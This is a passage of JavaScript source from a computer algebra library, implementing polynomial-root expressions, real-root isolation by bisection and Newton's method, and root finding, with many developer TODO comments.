  if (polynomial.getDegree() / polynomial.getGCDOfTermDegrees() > 64 * 2 * 32) {
    throw new Error();//TODO: too long
  }
  Expression.Symbol.call(this, null); // root.toString() - slow
  this.root = root;
  Object.freeze(this);
}
ExpressionPolynomialRoot.prototype = Object.create(Expression.Symbol.prototype);

ExpressionPolynomialRoot.create = function (polynomial, interval, options) {
  return new ExpressionPolynomialRoot(LazyPolynomialRoot.create(polynomial, interval, options));
};

ExpressionPolynomialRoot.prototype.multiplyInteger = function (x) {
  return x.multiplyPolynomialRoot(this);
};
ExpressionPolynomialRoot.prototype.multiply = function (e) {
  return e.multiplyPolynomialRoot(this);
};
ExpressionPolynomialRoot.prototype.multiplyExpression = function (e) {
  if (e.equals(Expression.ONE)) {
    return this;
  }
  //?
  //TODO: fix
  if (Expression.isConstant(e) && !Expression.has(e, Expression.Complex)) {
    return this.multiply(e);
  }
  return Expression.Symbol.prototype.multiplyExpression.call(this, e);
};
ExpressionPolynomialRoot.prototype.multiplyAddition = function (e) { // for performance (?) when `e` is a constant
  if (Expression.isConstant(e) && !Expression.has(e, Expression.Complex)) {
    return this.multiplyExpression(e);
  }
  return Expression.Symbol.prototype.multiplyAddition.call(this, e);
};
ExpressionPolynomialRoot.prototype.multiplyComplex = function (x) {
  return this.multiply(x);
};
Expression.prototype.multiplyPolynomialRoot = function (root) {
  if (Expression.isRealAlgebraicNumber(this) &&
      !Expression.has(this, Expression.ExpressionWithPolynomialRoot)) {
    var k = this;
    if (k.equals(Expression.ZERO)) {
      return k;
    }
    if (k.equals(Expression.ONE)) {
      return root;
    }
    return new ExpressionPolynomialRoot(root.root.scale(k));
  }
  if (this instanceof Expression.Complex && !this.imaginary.equals(Expression.ONE)) {
    return this.imaginary.multiply(root).multiply(Expression.I).add(this.real.multiply(root));
  }
  //TODO: ?
  //throw new Error();
  return this.multiplyExpression(root);
};
ExpressionPolynomialRoot.prototype._pow = function (n) {
  return new ExpressionPolynomialRoot(this.root._pow(n));
};
ExpressionPolynomialRoot.prototype.pow = function (e) {
  if (e instanceof Expression.Integer) {
    return this._pow(e.toNumber());
  }
  //TODO: upgrade (?)
  //TODO: ?
  if (e instanceof Expression.Division && e.getDenominator() instanceof Expression.Integer) {
    //TODO: verify
    return this._nthRoot(e.getDenominator().toNumber()).pow(e.getNumerator());
  }
  return Expression.Symbol.prototype.pow.call(this, e);
};
ExpressionPolynomialRoot.prototype.multiplyPolynomialRoot = function (x) {
  var y = this;
  return new ExpressionPolynomialRoot(x.root.multiply(y.root));
};
ExpressionPolynomialRoot.prototype.add = function (e) {
  return e.addPolynomialRoot(this);
};
ExpressionPolynomialRoot.prototype.addPolynomialRoot = function (x) {
  var y = this;
  return new ExpressionPolynomialRoot(x.root.add(y.root));
};
Expression.prototype.addPolynomialRoot = function (root) {
  if (Expression.isRealAlgebraicNumber(this) &&
      !Expression.has(this, Expression.ExpressionWithPolynomialRoot)) {
    var k = this;
    if (k.equals(Expression.ZERO)) { // for performance
      return root;
    }
    return new ExpressionPolynomialRoot(root.root.translate(k));
  }
  //throw new Error();
  return this.addExpression(root);
};
ExpressionPolynomialRoot.prototype.addExpression = function (e) {
  return this.add(e);//!?
};
ExpressionPolynomialRoot.prototype.divide = function (e) {
  //if (e.equals(Expression.ONE)) {
  //  return this;
  //}
  //if (!(e instanceof ExpressionPolynomialRoot) && !Expression.isConstant(e) || Expression.has(e, Expression.Matrix) || Expression.has(e, Expression.MatrixSymbol)) {
    //TODO: why - ?
  //  throw new Error();
  //}
  if (e instanceof Expression.Exponentiation) {
    return e.divideExpression(this);//?TODO: HACKs
  }
  if (e instanceof Expression.Multiplication && e.a instanceof Expression.Integer && e.b instanceof Expression.Exponentiation) {//TODO: ?
    return this.multiply(e.a.inverse()).divide(e.b);
  }
  return this.multiply(e.inverse());
};
ExpressionPolynomialRoot.prototype.divideExpression = function (x) {
  return x.multiply(this.inverse());
};
ExpressionPolynomialRoot.prototype.inverse = function () {
  return new ExpressionPolynomialRoot(this.root.inverse());
};
ExpressionPolynomialRoot.prototype.sign = function () {
  return this.root.sign();
};
var toRadicalExpression = function (root) {
  root = root.upgrade();
  var polynomialRoot = root.getAlpha();
  //TODO: root.getAlphaExpression()
  if (polynomialRoot.polynomial.getDegree() === 1) {
    //TODO: ???
    return polynomialRoot.polynomial.getroots()[0];
  }
  //TODO: ?
  var g = polynomialRoot.polynomial.getGCDOfTermDegrees();
  if (g > 1) {
    var v = toRadicalExpression(root._pow(g));
    if (v != null) {
      var vg = Expression.NthRoot.makeRoot(v, g);
      return g % 2 === 1 || root.sign() > 0 ? vg : new Expression.Negation(vg);
    }
  }
  // convert to depressed:
  var h = polynomialRoot.polynomial._getShiftToDepressed();
  if (!h.equals(Expression.ZERO)) {
    var tmp = toRadicalExpression(root.translate(h));
    if (tmp != null) {
      return new Expression.Addition(tmp, h.negate());
    }
  }
  return null;
};

ExpressionPolynomialRoot.prototype.toString = function (options) {
  //return new ExpressionWithPolynomialRoot(this, this).toString(options);
  options = options || {};
  if (options.rounding == null) {
    var p = this.root.getAlpha().polynomial;
    if (p.getDegree() / p.getGCDOfTermDegrees() < 10 && LazyPolynomialRoot._isSimpleForUpgrade(this.root.getAlphaExpression(), new Expression.Symbol('Î±'))) { //TODO: REMOVE !!!
      var re = toRadicalExpression(this.root);
      if (re != null) {
        return re.toString(options);
      }
    }
  }
  return toDecimalStringInternal(this, options.rounding || {fractionDigits: 3});
};
ExpressionPolynomialRoot.prototype.equals = function (other) {
  if (other instanceof ExpressionPolynomialRoot) {
    return this.root.equals(other.root);
  }
  // optimization
  if (other instanceof Expression.Integer) {
    if (other.equals(Expression.ZERO)) {
      return false;
    }
  }
  if (!Expression.isRealAlgebraicNumber(other)) {//to avoid bugs with i**n
    return false;
  }
  /*if (Expression.isConstant(other)) {
    if (!this.root.polynomial.calcAt(other).equals(Expression.ZERO)) {
      return false;
    }
    var withinInterval = function (x, interval) {
      return Expression._isPositive(x.subtract(interval.a)) && Expression._isPositive(x.subtract(interval.b).negate());
    };
    return withinInterval(other, this.interval);
  }*/
  //TODO: optimize
  return this.subtract(other).equals(Expression.ZERO);
};
ExpressionPolynomialRoot.prototype.compare4MultiplicationComplex = function (x) {
  return -1;
  //return +1;
};
ExpressionPolynomialRoot.prototype.compare4MultiplicationNthRoot = function (x) {
  return 0;
};
ExpressionPolynomialRoot.prototype.compare4Multiplication = function (y) {
  if (y instanceof Expression.Complex) {
    return +1;
    //return -1;
  }
  if (y instanceof Expression.Integer) {
    return +1;
  }
  if (y instanceof ExpressionPolynomialRoot) {
    return 0;
  }
  if (y instanceof Expression.NthRoot) {
    return 0;//?
  }
  if (y instanceof Expression.Symbol) {
    return -1;
  }
  return Expression.Symbol.prototype.compare4Multiplication.call(this, y);
};
ExpressionPolynomialRoot.prototype.compare4MultiplicationSymbol = function (x) {
  return +1;
};
ExpressionPolynomialRoot.prototype.compare4Addition = function (y) {
  if (y instanceof ExpressionPolynomialRoot) {
    return 0;//?
  }
  if (y instanceof Expression.Symbol) {
    return +1;
  }
  if (y instanceof Expression.NthRoot) {
    return 0;//?
  }
  if (Expression.isRealAlgebraicNumber(y)) {
    return 0;//?
  }
  return Expression.Symbol.prototype.compare4Addition.call(this, y);
};
ExpressionPolynomialRoot.prototype.compare4AdditionSymbol = function (x) {
  return -1;
};
ExpressionPolynomialRoot.prototype.compare4AdditionNthRoot = function (x) {
  return 0;
};

ExpressionPolynomialRoot.prototype._nthRoot = function (n) {//?
  if (this.root.sign() < 0 && n % 2 === 0) {
    if (n !== 2) {
      throw new RangeError("NotSupportedError");
    }
    //TODO: check
    return Expression.I.multiply(this.negate()._nthRoot(n));
  }
  return new ExpressionPolynomialRoot(this.root._nthRoot(n));
};

ExpressionPolynomialRoot.prototype.upgrade = function () {
  return new ExpressionPolynomialRoot(this.root.upgrade());//TODO: ?
};

ExpressionPolynomialRoot.prototype.isNegative = function () {
  return this.root.sign() < 0;
};

Expression.prototype.upgrade = function () { //TODO: remove !!!
  return this;
};

ExpressionPolynomialRoot.prototype.isExact = function () {
  //TODO: fix - ?
  return false;
};

ExpressionPolynomialRoot.prototype.negate = function () {
  return new ExpressionPolynomialRoot(this.root.negate()); // for performance
};

ExpressionPolynomialRoot.prototype.simplifyExpression = function () {//TODO: remove - ?
  return this;
};

ExpressionPolynomialRoot.prototype.toMathML = function (options) {
  options = options || {};
  if (options.rounding == null) {
    var p = this.root.getAlpha().polynomial;
    if (p.getDegree() / p.getGCDOfTermDegrees() < 10 && LazyPolynomialRoot._isSimpleForUpgrade(this.root.getAlphaExpression(), new Expression.Symbol('Î±'))) { //TODO: REMOVE !!!
      var re = toRadicalExpression(this.root);
      if (re != null) {
        return re.toMathML(options);
      }
    }
  }
  return toDecimalStringInternal(this, options.rounding || {fractionDigits: 3}, Expression._decimalToMathML, Expression._complexToMathML);
};

//TODO: ?????
ExpressionPolynomialRoot.prototype.getPrecedence = function () {
  //TODO: avoid (?)
  if (true) {
    var p = this.root.getAlpha().polynomial;
    if (p.getDegree() / p.getGCDOfTermDegrees() < 10 && LazyPolynomialRoot._isSimpleForUpgrade(this.root.getAlphaExpression(), new Expression.Symbol('Î±'))) { //TODO: REMOVE !!!
      var re = toRadicalExpression(this.root);
      if (re != null) {
        return re.getPrecedence();
      }
    }
  }
  return 1000;
};
ExpressionPolynomialRoot.prototype.isRightToLeftAssociative = function () {
  return true;
};
ExpressionPolynomialRoot.prototype.isUnaryPlusMinus = function () {
  return true;//TODO: !?
};

//ExpressionPolynomialRoot.prototype.complexConjugate = function () {//TODO: test
//  return this;
//};

ExpressionPolynomialRoot.prototype._calc = function (polynomial) {
  return new ExpressionPolynomialRoot(this.root._calc(polynomial));
};

Expression.ExpressionPolynomialRoot = ExpressionPolynomialRoot;

Expression.toPolynomialRoot = function (e) {
  var x = e instanceof Expression.NthRoot ? e.a : e;//TODO: remove
  var n = e instanceof Expression.NthRoot ? e.n : 1;//TODO: remove
  var symbol = new Expression.Symbol('x');
  if (!(x.getDenominator() instanceof Expression.Integer)) {
    throw new TypeError();
  }
  var p = Polynomial.toPolynomial(Expression.getConjugateExpression(symbol._pow(n).subtract(x).getNumerator()), symbol);
  //TODO: remove:
  if (p.getDegree() <= 8 && (true || isSmall(p))) {//TODO: ?
    var factor = p.factorize();
    if (factor != null && factor.getDegree() < p.getDegree() && factor.getDegree() === 4) {//?
      var roots = Polynomial.polynomialGCD(factor, Polynomial.toPolynomial(symbol._pow(n).subtract(x), symbol)).getroots();
      for (var iteratorroot = roots[globalThis.Symbol.iterator](), root = iteratorroot.next().value; root != null; root = iteratorroot.next().value) {
        if (root._pow(n).equals(x)) {
          //debugger;
          return Expression._isPositive(root) || n % 2 !== 0 ? root : root.negate();
        }
      }
    }
  }
  while (p.getDegree() > 0) {
    //var root = Expression.toPolynomialRoot(x)._nthRoot(n);
    
    //TODO: Expression#toPolynomialRoot() - ?
    //TODO: move up (!?)
    //p = p.squareFreeFactors().a1;//TODO: which one (?)
    var factor = p.factorize() || p;
    var isComplex = n === 2 && Expression.has(e.radicand, Expression.Complex);
    var zeros = factor.getZeros(undefined, isComplex);
    if (n % 2 === 0 && zeros.length === 2) {
      //TODO: remove
      if (Expression._isPositive(zeros[1]) && Expression._isPositive(x)) {
        return zeros[1];
      }
    }
    //TODO: find zero only on interval
    for (var iteratorzero = zeros[globalThis.Symbol.iterator](), zero = iteratorzero.next().value; zero != null; zero = iteratorzero.next().value) {
      if (zero.root != null && Expression._isPositive(zero) || isComplex && Expression._isPositive(Expression.getComplexNumberParts(zero).real)) {
        if (zero._pow(n).equals(x)) {
          return zero;
        }
      }
    }
    //TODO: ?
    p = p.divideAndRemainder(factor, "throw");
  }
  console.error(e.toString());
  return undefined;
};



  Polynomial.prototype.signVariations = function () {
    var result = 0;
    var sign = 0;
    for (var i = this.a.size - 1; i >= 0; i -= 1) {
      var s = this.a.coefficient(i).sign();
      if (s !== 0) {
        if (sign === 0) {
          sign = s;
        } else {
          if (sign !== s) {
            sign = s;
            result += 1;
          }
        }
      }
    }
    return result;
  };

  Polynomial.prototype._getNonNegativeRealRootIntervals = function () {
    // The polynomial should be square free, the check is commented out for performance
    //if (!this.isSquareFreePolynomial()) {
    //  throw new RangeError();
    //}
    // https://en.wikipedia.org/wiki/Real-root_isolation#Pseudocode
    var B = this.getPositiveRealRootsBound();
    if (B.equals(Expression.ZERO)) {
      return [];
    }
    // https://en.wikipedia.org/wiki/Real-root_isolation#Bisection_method
    var p = this._scaleRoots(B.inverse()); // map [0; B] to [0; 1]
    var maxPositiveRealRoots = (this.getCoefficient(0).equals(Expression.ZERO) ? 1 : 0) + this.signVariations();
    var L = function (a, b, q) { // get root intervals of q on [0; 1]
      var zero = q.getCoefficient(0).equals(Expression.ZERO);
      var newQ = zero ? q.divideAndRemainder(Polynomial.of(Expression.ZERO, Expression.ONE), "throw").quotient : q;
      var qq = newQ._exponentiateRoots(-1)._translateRoots(Expression.ONE.negate());
      //TODO: what is wrong with Wikipedia - ?
      var v = qq.signVariations();
      if (v === 1 && zero) {
        v = 0/0;//!?
      }
      if (v === 0 && zero) {
        return [{a: a, b: a}];
      }
      if (v === 1 && qq.getCoefficient(0).equals(Expression.ZERO)) {
        v = 0/0;//!?
      }
      if (v === 1) {
        return [{a: a, b: b}];
      } else if (v !== 0) {
        var firstQ = q._scaleRoots(Expression.TWO);
        var middle = a.add(b).divide(Expression.TWO);
        var first = L(a, middle, firstQ);
        if (first.length >= maxPositiveRealRoots) {
          return first;//!
        }
        var secondQ = firstQ._translateRoots(Expression.ONE.negate());
        var second = L(middle, b, secondQ);
        return first.concat(second);
      }
      return [];
    };
    return L(Expression.ZERO, Expression.ONE, p).map(function (entry) { return ({a: entry.a.multiply(B), b: entry.b.multiply(B)}); });
  };

  Polynomial.prototype.getRootIntervals = function () {
    return this._scaleRoots(Expression.ONE.negate())._getNonNegativeRealRootIntervals().map(function (entry) { return ({a: entry.b.negate(), b: entry.a.negate()}); }).reverse().concat(this._getNonNegativeRealRootIntervals());
  };

  Polynomial.prototype.getPositiveRealRootsBound = function () {
    //TODO: only integer coefficients (?)
    // https://en.wikipedia.org/wiki/Sturm%27s_theorem#Number_of_real_roots
    // https://en.wikipedia.org/wiki/Geometrical_properties_of_polynomial_roots#Bounds_of_positive_real_roots
    var M = null;
    //TODO: fix the iteration
    var n = this.getDegree();
    var an = this.getLeadingCoefficient();
    for (var i = 0; i <= this.getDegree() - 1; i += 1) {
      var v = this.getCoefficient(i).negate().truncatingDivide(an);
      if (v.sign() >= 0) {
        var c = Expression.TWO.multiply(v._integerNthRoot(n - i).add(Expression.ONE));
        if (M == null || M.compareTo(c) < 0) {
          M = c;
        }
      }
    }
    if (M == null) {
      return Expression.ZERO;
    }
    //!2020-12-19
    // round to a power of two:
    M = Expression.TWO._pow(M.getNumerator().bitLength() - M.getDenominator().bitLength() + 1);
    //!
    return M;
  };

  //TODO: BigDecimal - ?, rounding - ?
  Polynomial.prototype.getZero = function (interval, precision) {
    var floorDiv = function (a, b) {
      if (b.compareTo(Expression.ZERO) < 0) {
        a = a.negate();
        b = b.negate();
      }
      return a.compareTo(Expression.ZERO) >= 0 ? a.truncatingDivide(b) : a.add(Expression.ONE).truncatingDivide(b).subtract(Expression.ONE);
    };
    var roundFloor = function (point, e) {
      var n = point.getNumerator().multiply(e);
      var d = point.getDenominator();
      return floorDiv(n, d);
    };
    var sign = function (v) {
      return Math.sign(v.getNumerator().compareTo(Expression.ZERO));
    };
    //var BASE = Expression.TEN;
    var BASE = Expression.TWO;
    var e = Expression.pow(BASE, precision); // epsilon^-1
    if (!(e instanceof Expression.Integer)) {
      throw new RangeError("epsilon^-1 is not an integer");
    }
    var a = interval.a;
    var b = interval.b;
    // (b - a) * Math.pow(10, precision) > min(abs(a), abs(b))
    // (b - a) * Math.pow(10, fractionDigits) > 1
    //TODO: fix to use precision, not fractionDigits
    // e * (b - a) > 0:
    if (e.multiply(a.getDenominator().multiply(b.getNumerator()).subtract(b.getDenominator().multiply(a.getNumerator()))).compareTo(b.getDenominator().multiply(a.getDenominator())) > 0) {
      //TODO:
      var tmp = true && precision >= 16 / Math.log10(BASE.toNumber()) ? this.getZero(interval, Math.floor(precision / 4)) : interval;
      a = tmp.a;
      b = tmp.b;

      var n = this.getDegree();
      var p = this._scaleRoots(e);
      p = p.primitivePart();//?
      var sa = roundFloor(a, e).add(Expression.ONE); // a.getNumerator().multiply(e).truncatingDivide(a.getDenominator()).add(Expression.ONE);//?
      var sb = roundFloor(b, e); // b.getNumerator().multiply(e).truncatingDivide(b.getDenominator());//?
      console.assert(sa.multiply(a.getDenominator()).subtract(a.getNumerator().multiply(e)).compareTo(Expression.ZERO) >= 0); // sa/e >= a
      console.assert(sb.multiply(b.getDenominator()).subtract(b.getNumerator().multiply(e)).compareTo(Expression.ZERO) <= 0); // sb/e <= b
      //TODO: bigdecimal - ?
      // remember values at boundaries to reuse in the loop:
      var pa = p.calcAt(sa);
      var pb = p.calcAt(sb);
      var spb = sign(pb);
      var spa = sign(pa);
      if (spa === 0) {
        return {a: sa.divide(e), b: sa.divide(e)};
      }
      if (spb === 0) {
        return {a: sb.divide(e), b: sb.divide(e)};
      }
      if (spa === spb) {
        if (spa !== (sign(this.calcAt(a)) || sign(this.calcAt(b).negate()) || spa)) {
          return {a: a, b: sa.divide(e)};
        }
        if (spb !== sign(this.calcAt(b))) {
          return {a: sb.divide(e), b: b};
        }
        throw new RangeError();//?
      }
      a = sa;
      b = sb;
      // bisection method
      var cc = 0;
      var d = p.derive();
      var width = b.subtract(a);
      while (width.compareTo(Expression.ONE) > 0) {// b - a > 1
        var middle = a.add(width.truncatingDivide(Expression.TWO));
        //console.log(eval(a.divide(e).toString()) + ' - ' + eval(b.divide(e).toString()));
        //?
        if (cc % 3 !== 2 && width.compareTo(a.abs()) < 0) {// TODO: test for the case when a < 0
          // TODO: better guesses
          // Newton's method
          var x = cc % 3 === 1 ? a : b;
          var px = x === a ? pa : (x === b ? pb : undefined);
          var c = d.calcAt(x);
          if (!c.equals(Expression.ZERO)) {
            x = x.subtract(px.truncatingDivide(c));
            if (x.compareTo(a) <= 0) {
              x = a.add(Expression.ONE);
            }
            if (x.compareTo(b) >= 0) {
              x = b.subtract(Expression.ONE);
            }
            //console.log("N: " + a + "  - " + x);
            middle = x;
          }
        }
        cc += 1;
        //?
        var v = p.calcAt(middle);
        var sv = sign(v);
        if (sv === spb) {
          b = middle;
          pb = v;
        } else if (sv === spa) {
          a = middle;
          pa = v;
        } else {
          a = middle;
          b = middle;
          pa = v;
          pb = v;
        }
        width = b.subtract(a);
      }
      //console.debug(cc);
      a = a.divide(e);
      b = b.divide(e);
    }
    return {a: a, b: b};
  };

  Polynomial.prototype.hasRoot = function (polynomialRoot) {
    var f = this;
    if (f.equals(Polynomial.ZERO)) {
      return true;
    }
    //!new 2021-02-20 (TODO: CHECK)
    if (!f.hasIntegerCoefficients() && f.hasComplexCoefficients()) {
      return f.map(function (c) { return c instanceof Expression.Integer ? c : c.real; }).hasRoot(polynomialRoot) && f.map(function (c) { return c instanceof Expression.Integer ? Expression.ZERO : c.imaginary; }).hasRoot(polynomialRoot);
    }
    //!
    
    if (!f.hasIntegerCoefficients() &&
        !f.hasComplexCoefficients() &&
        !f._testCoefficients(function (c) { return !Expression.has(c, Expression.Complex); }) &&
        f._testCoefficients(function (c) { return Expression.isConstant(c); })) { // x-i^n
      return f.map(function (c) { return Expression.getComplexNumberParts(c).real; }).hasRoot(polynomialRoot) &&
             f.map(function (c) { return Expression.getComplexNumberParts(c).imaginary; }).hasRoot(polynomialRoot);
    }

    var p = polynomialRoot.polynomial;
    var g = null;
    //!
    if (!f.hasIntegerCoefficients()) {
      var variable = new Expression.Symbol('~');
      var ff = f.calcAt(variable);
      var tmp = Expression.getMultivariatePolynomial(ff);
      if (tmp != null && !tmp.v.equals(variable) && tmp.v instanceof Expression.Symbol) {
        g = Polynomial.polynomialGCD(Polynomial.toPolynomial(tmp.p.getContent(), variable), p);
      }
    }
    if (g == null) {
      g = Polynomial.polynomialGCD(f, p);
    }
    //!
    if (g.getDegree() < 1) {
      return false;
    }
    var i = polynomialRoot.interval;

    if (!g.hasIntegerCoefficients()) {
      //TODO: BUG?
      //?new
      var variable = new Expression.Symbol('$$');
      var e = g.calcAt(variable);
      var c = Expression.getComplexNumberParts(e);
      if (c != null && !c.imaginary.equals(Expression.ZERO)) {
        g = Polynomial.toPolynomial(c.real.subtract(c.imaginary.multiply(Expression.I)).multiply(e), variable).getSquareFreePolynomial();
      }
      //?
    }

    // https://en.wikipedia.org/wiki/Budan%27s_theorem#Budan's_statement
    // as we used gcd the number of roots should be <= 0 on this interval for g and so:
    var n = g._translateRoots(i.a.negate()).signVariations() - g._translateRoots(i.b.negate()).signVariations();
    return n % 2 === 1;
    //return g.numberOfRoots(i) === 1;
  };

  // get number of distinct roots on the closed interval [a, b]
  Polynomial.prototype.numberOfRoots = function (interval) {
interval = interval == undefined ?  null : interval;

    if (!this.hasIntegerCoefficients()) {
      //debugger;
      //return this.numberOfRoots3(interval);
      throw new RangeError();
    }
    if (interval == null) {
      interval = {a: this._scaleRoots(Expression.ONE.negate()).getPositiveRealRootsBound().negate(), b: this.getPositiveRealRootsBound()};
    }
    var p = this;
    if (!interval.a.equals(Expression.ZERO)) {
      p = p._scaleRoots(interval.a.inverse())
           ._translateRoots(Expression.ONE.negate());
      interval = {
        a: Expression.ZERO,
        b: interval.b.divide(interval.a).subtract(Expression.ONE)
      };
      if (interval.b.getNumerator().sign() < 0) {
        interval = {a: interval.a, b: interval.b.negate()};
        p = p._scaleRoots(Expression.ONE.negate());
      }
    }
    console.assert(interval.a.equals(Expression.ZERO));
    var zeros = 0;
    while (p.getCoefficient(zeros).equals(Expression.ZERO)) {
      zeros += 1;
    }
    if (zeros > 1) {
      throw new RangeError();
    }
    if (zeros > 0) {
      p = p.divideAndRemainder(Polynomial.of(Expression.ONE).shift(zeros), "throw").quotient;
    }
    return (zeros > 0 ? 1 : 0) + 
           p._exponentiateRoots(-1)
            ._scaleRoots(interval.b)
            ._translateRoots(Expression.ONE.negate())
            ._getNonNegativeRealRootIntervals().length;
  };

  // Polynomial.toPolynomial(ExpressionParser.parse("x^3-8x^2+21x-18"), ExpressionParser.parse("x")).getZeros(3).toString()
  Polynomial.prototype.getZeros = function (precision, complex) {
precision = precision == undefined ?  0 : precision;
complex = complex == undefined ?  false : complex;

    if (this.getCoefficient(0).equals(Expression.ZERO)) {
      if (this.getLeadingCoefficient().equals(Expression.ZERO)) {
        throw new TypeError();
      }
      var i = 0;
      while (this.getCoefficient(i).equals(Expression.ZERO)) {
        i += 1;
      }
      var tmp = this.divideAndRemainder(Polynomial.of(Expression.ONE).shift(i)).quotient.getZeros(precision, complex);
      return tmp.concat(new Array(i).fill(Expression.ZERO));
    }
    //TODO: test
    var content = this.getContent();
    var f = this.scale(content.getDenominator()).divideAndRemainder(Polynomial.of(content.getNumerator()), "throw").quotient;

    // https://en.wikipedia.org/wiki/Square-free_polynomial
    var tmp = f.squareFreeFactors();
    var a0 = tmp.a0;
    var a1 = tmp.a1;

    if (a0.getDegree() !== 0) {
      var tmp1 = a1.getZeros(precision, complex); // roots with multiplicity = 1 (?)
      var tmp2 = a0.getZeros(precision, complex);
      var result = [];
      var previous = undefined;
      for (var i = 0; i < tmp2.length; i += 1) {
        var zero = tmp2[i];
        if (zero !== previous) {
          result.push(zero);
          previous = zero;
        }
        result.push(zero);
      }
      return tmp1.concat(result);
    }

    var p = f;
    if (p.getDegree() === 0) {
      return [];
    }

    //!
    p = p.scale(p.getContent().inverse());
    //!

    if (!f.hasIntegerCoefficients()) {
      
      var toPolynomialWithIntegerCoefficients = function (polynomial) {
        if (!polynomial.hasIntegerCoefficients()) {
          var variable = new Expression.Symbol('$$');
          var e = polynomial.calcAt(variable);
          var c = Expression.getConjugateExpression(e);
          if (c != null && !c.equals(e)) {
            //TODO: what if multiple (?) - ?
            return Polynomial.toPolynomial(c, variable);
          }
          
          //!new 2022-08-28
          // p_1(x, alpha) = 0
          // p_2(alpha) = 0
          // Res_alpha(p_1, p_2) = 0
          var root = null;
          for (var i = 0; i < polynomial.getDegree(); i += 1) {
            var c = polynomial.getCoefficient(i);
            if (c instanceof Expression.ExpressionPolynomialRoot) {
              debugger;
              var alpha = c.root.upgrade().getAlpha();
              var v = new Expression.Symbol("$a");
              var p_1 = Polynomial.toPolynomial(polynomial.map(function (cc) { return cc === c ? v : cc; }).calcAt(new Expression.Symbol('$$')), v);
              var p_2 = alpha.polynomial;
              var res = Polynomial.toPolynomial(Polynomial.resultant(p_1, p_2), new Expression.Symbol("$$")).primitivePart();
              return toPolynomialWithIntegerCoefficients(res);
            }
          }
        }
        return polynomial;
      };

      //?new
      var f1 = toPolynomialWithIntegerCoefficients(f);
      if (!f1.equals(f)) {
        var result = [];
        var tmp = f1.getZeros(precision, complex);
        console.time('checking roots');
        //TODO: do not check conjugate pairs (?) when polynomial has no integer factor
        for (var i = 0; i < tmp.length; i += 1) {
          var zero = tmp[i];
          if (zero instanceof ExpressionPolynomialRoot && zero.root.getAlphaExpression().equals(new Expression.Symbol('Î±')) ? f.hasRoot(zero.root.getAlpha()) :
              zero instanceof ExpressionWithPolynomialRoot && zero.e === zero.root ? f.hasRoot(zero.root) :
              (zero instanceof ExpressionWithPolynomialRoot ? zero._calc(f) : f.calcAt(zero)).equals(Expression.ZERO)) {
            result.push(zero);
          } else {
            //TODO:?
            console.debug(zero.root);
          }
        }
        console.timeEnd('checking roots');
        return result;
      }
      //!new
      // u * x + v = t
      // u**n*x**n = a_n*x**n, u = a_n**(1/n)
      // u**(n-1)*x**(n-1)*v*n+u**(n-1)*x**(n-1) = a_(n-1)*x**(n-1)
      var u = Polynomial.of(Expression.ONE).shift(f.getDegree()).subtract(Polynomial.of(f.getLeadingCoefficient())).getroots();
      if (u.length !== 0) {
        u = u[0];
        var v = f.getCoefficient(f.getDegree() - 1).divide(u._pow(f.getDegree() - 1)).subtract(Expression.ZERO).divide(Expression.Integer.fromNumber(f.getDegree()));
        var x = new Expression.Symbol('$$');//?
        var pt = Polynomial.toPolynomial(p.calcAt(x.subtract(v).divide(u)).getNumerator(), x);
        if (pt.hasIntegerCoefficients()) {//TODO: ?
          return pt.getZeros(precision, complex).map(function (zero) {
            return zero.subtract(v).divide(u);
          });
        }
      }
      //!
      //?
      console.debug('not all roots were found!!!');
      return [];
    }

    //!new
    if (p.getDegree() === 3) {
      //?
    }
    //!

    // https://en.wikipedia.org/wiki/Sturm%27s_theorem
    var intervals = p.getRootIntervals();

    // https://math.stackexchange.com/questions/309178/polynomial-root-finding
    // "it is guaranteed that there is a sign change inside every interval (because there are no repeated zeroes)"
    var result = new Array(intervals.length);
    var enableNewClass = true;//TODO: ?
    for (var i = 0; i < intervals.length; i += 1) {
      var zero = p.getZero(intervals[i], precision);
      if (zero.a.equals(zero.b)) {
        result[i] = zero.a;//TODO: fix
      } else {
        //! p, not f, as f may have roots with multiplicity > 1
        if (!enableNewClass) {
          var root = new Expression.PolynomialRootSymbol(p, zero);
          result[i] = new ExpressionWithPolynomialRoot(root, root);
        } else {
          //TODO: why skipFactorization if getZeros does not check for primitive polynomial
          var root = ExpressionPolynomialRoot.create(p, zero, {skipFactorization: true});
          //result[i] = new ExpressionWithPolynomialRoot(new Expression.Symbol('$Î±'), root);
          result[i] = root;
        }
      }
    }
    //return result;

    //!new
    //var p = np;
    if (intervals.length !== p.getDegree() && true && complex) {
      //!new
      if (p.getDegree() >= 4) {//?
        var factor = p.factorize();
        if (factor != null) {
          //TODO: remove double work
          return factor.getZeros(precision, complex).concat(p.divideAndRemainder(factor, "throw").quotient.getZeros(precision, complex));
        }
      }
      //!
      if (p.isEven()) {
        //debugger;
        var zeros = p._exponentiateRoots(2).getZeros(precision, complex);
        for (var iteratorzero = zeros[globalThis.Symbol.iterator](), zero = iteratorzero.next().value; zero != null; zero = iteratorzero.next().value) {
          //var z = zero.squareRoot();
          // https://en.wikipedia.org/wiki/Complex_number#Square_root
          var squareRoot = function (z) {
            var tmp = Expression.getComplexNumberParts(z);
            var a = tmp.real;
            var b = tmp.imaginary;
            var aapbb = a._pow(2).add(b._pow(2)).squareRoot();
            var Î³ = a.add(aapbb).divide(Expression.TWO).squareRoot();
            var sign = (b.compareTo(Expression.ZERO) > 0 ? Expression.ONE : Expression.ONE.negate());
            var tmp = a.negate().add(aapbb).divide(Expression.TWO);
            //debugger;
            var Î´ = sign.multiply(tmp.squareRoot());
            return Î³.add(Î´.multiply(Expression.I));
          };
          //zero = zero instanceof ExpressionWithPolynomialRoot ? zero.upgrade() : zero;
          if (!Expression._isPositive(zero)) {
            var z = squareRoot(zero.e != null ? zero.upgrade() : zero);
            result.push(z);
            result.push(z.negate());
          }
        }
        return result;
      }
      //var p = stringToPolynomial("x^5+2*x^2+2*x+3");

      var e = p.calcAt(new Expression.Symbol("a").add(new Expression.Symbol("b").multiply(Expression.I)));
      var ce = Expression.getComplexNumberParts(e);
      var cpa = ce.real;//TODO: ?
      var cpb = ce.imaginary.divide(new Expression.Symbol('b'));
      var getZeros1 = function (p) {//TODO: !? use everywhere (?)
        var tmp = p.squareFreeFactors();
        if (tmp.a0.getDegree() !== 0) {
          return getZeros1(tmp.a0).concat(getZeros1(tmp.a1));
        }
        var factor = p.factorize();
        if (factor != null) {
          //TODO: remove double work
          //return factor.getZeros(undefined, false).concat(p.divideAndRemainder(factor, "throw").quotient.getZeros(undefined, false));
          var tmp = getZeros1(factor);
          var t = p.divideAndRemainder(factor, "throw").quotient;
          if (0 === t._getNonNegativeRealRootIntervals().length) {
